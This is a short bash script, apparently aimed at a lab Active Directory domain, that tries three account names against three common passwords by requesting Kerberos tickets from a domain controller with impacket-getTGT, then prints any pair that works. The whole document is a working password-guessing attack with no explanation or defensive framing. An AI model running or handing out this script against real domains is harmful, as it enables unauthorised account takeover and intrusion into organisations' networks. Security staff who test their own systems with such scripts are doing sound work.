#!/bin/bash
DC=192.0.2.10
for principal in IT Administrator service; do
  for secret in 123456 password 'Admin@123'; do
    reply=$(timeout 4 impacket-getTGT "LAB/${principal}:${secret}" -dc-ip "$DC" 2>&1)
    if echo "$reply" | grep -q "Saving ticket"; then
      echo "MATCH: ${principal}:${secret}"
    fi
  done
done
